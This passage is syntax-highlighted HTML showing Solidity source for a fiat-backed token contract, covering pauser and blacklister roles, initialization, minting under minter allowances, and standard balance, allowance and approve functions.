keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev throws if called by any account other than the pauser\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyPauser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> pauser<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Pausable: caller is not the pauser\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev called by the owner to pause, triggers stopped state\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyPauser <span class=\"token punctuation\">&#123;</span>\n        paused <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Pause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev called by the owner to unpause, returns to normal state\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">unpause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyPauser <span class=\"token punctuation\">&#123;</span>\n        paused <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Unpause</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev update the pauser role\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updatePauser</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newPauser<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            _newPauser <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Pausable: new pauser is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pauser <span class=\"token operator\">=</span> _newPauser<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">PauserChanged</span><span class=\"token punctuation\">(</span>pauser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Blacklistable</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> blacklister<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> blacklisted<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Blacklisted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">UnBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> _account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">BlacklisterChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> newBlacklister<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Throws if called by any account other than the blacklister\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyBlacklister</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> blacklister<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Blacklistable: caller is not the blacklister\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Throws if argument account is blacklisted\n     * @param _account The address to check\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _account<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token operator\">!</span>blacklisted<span class=\"token punctuation\">[</span>_account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Blacklistable: account is blacklisted\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Checks if account is blacklisted\n     * @param _account The address to check\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isBlacklisted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> blacklisted<span class=\"token punctuation\">[</span>_account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Adds account to blacklist\n     * @param _account The address to blacklist\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">blacklist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyBlacklister <span class=\"token punctuation\">&#123;</span>\n        blacklisted<span class=\"token punctuation\">[</span>_account<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Blacklisted</span><span class=\"token punctuation\">(</span>_account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Removes account from blacklist\n     * @param _account The address to remove from the blacklist\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">unBlacklist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyBlacklister <span class=\"token punctuation\">&#123;</span>\n        blacklisted<span class=\"token punctuation\">[</span>_account<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">UnBlacklisted</span><span class=\"token punctuation\">(</span>_account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updateBlacklister</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newBlacklister<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            _newBlacklister <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Blacklistable: new blacklister is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        blacklister <span class=\"token operator\">=</span> _newBlacklister<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">BlacklisterChanged</span><span class=\"token punctuation\">(</span>blacklister<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FiatTokenV1</span> <span class=\"token keyword\">is</span> AbstractFiatTokenV1<span class=\"token punctuation\">,</span> Ownable<span class=\"token punctuation\">,</span> Pausable<span class=\"token punctuation\">,</span> Blacklistable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> symbol<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">public</span> decimals<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> currency<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> masterMinter<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">internal</span> initialized<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> balances<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> allowed<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">internal</span> totalSupply_ <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> minters<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> minterAllowed<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> minter<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> burner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">MinterConfigured</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> minter<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> minterAllowedAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">MinterRemoved</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> oldMinter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">MasterMinterChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> newMasterMinter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenName<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenSymbol<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tokenCurrency<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> tokenDecimals<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> newMasterMinter<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> newPauser<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> newBlacklister<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> newOwner\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>initialized<span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: contract is already initialized\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newMasterMinter <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: new masterMinter is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newPauser <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: new pauser is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newBlacklister <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: new blacklister is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newOwner <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: new owner is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        name <span class=\"token operator\">=</span> tokenName<span class=\"token punctuation\">;</span>\n        symbol <span class=\"token operator\">=</span> tokenSymbol<span class=\"token punctuation\">;</span>\n        currency <span class=\"token operator\">=</span> tokenCurrency<span class=\"token punctuation\">;</span>\n        decimals <span class=\"token operator\">=</span> tokenDecimals<span class=\"token punctuation\">;</span>\n        masterMinter <span class=\"token operator\">=</span> newMasterMinter<span class=\"token punctuation\">;</span>\n        pauser <span class=\"token operator\">=</span> newPauser<span class=\"token punctuation\">;</span>\n        blacklister <span class=\"token operator\">=</span> newBlacklister<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setOwner</span><span class=\"token punctuation\">(</span>newOwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        initialized <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Throws if called by any account other than a minter\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyMinters</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>minters<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: caller is not a minter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Function to mint tokens\n     * @param _to The address that will receive the minted tokens.\n     * @param _amount The amount of tokens to mint. Must be less than or equal\n     * to the minterAllowance of the caller.\n     * @return A boolean that indicates if the operation was successful.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _amount<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        whenNotPaused\n        onlyMinters\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: mint to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"FiatToken: mint amount not greater than 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> mintingAllowedAmount <span class=\"token operator\">=</span> minterAllowed<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            _amount <span class=\"token operator\">&lt;=</span> mintingAllowedAmount<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: mint amount exceeds minterAllowance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        totalSupply_ <span class=\"token operator\">=</span> totalSupply_<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        minterAllowed<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mintingAllowedAmount<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Throws if called by any account other than the masterMinter\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyMasterMinter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> masterMinter<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"FiatToken: caller is not the masterMinter\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Get minter allowance for an account\n     * @param minter The address of the minter\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">minterAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> minter<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> minterAllowed<span class=\"token punctuation\">[</span>minter<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Checks if account is a minter\n     * @param account The address to check\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isMinter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> minters<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Amount of remaining tokens spender is allowed to transfer on\n     * behalf of the token owner\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @return Allowance amount\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        override\n        <span class=\"token keyword\">view</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> allowed<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Get totalSupply of token\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> override <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> totalSupply_<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Get token balance of an account\n     * @param account address The account\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        override\n        <span class=\"token keyword\">view</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Set spender's allowance over the caller's tokens to be a given\n     * value.\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     * @return True if successful\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">external</span>\n        override\n        whenNotPaused\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">notBlacklisted</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Internal function to set allowance\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param value     Allowance amount\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>owner <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>spender <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        allowed<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Transfer tokens by spending allowance\n     * @param from  Payer's address\n     * @param to    Payee's address\n     * @param value Transfer amount\n     * @return True if successful\n     */</span>\n  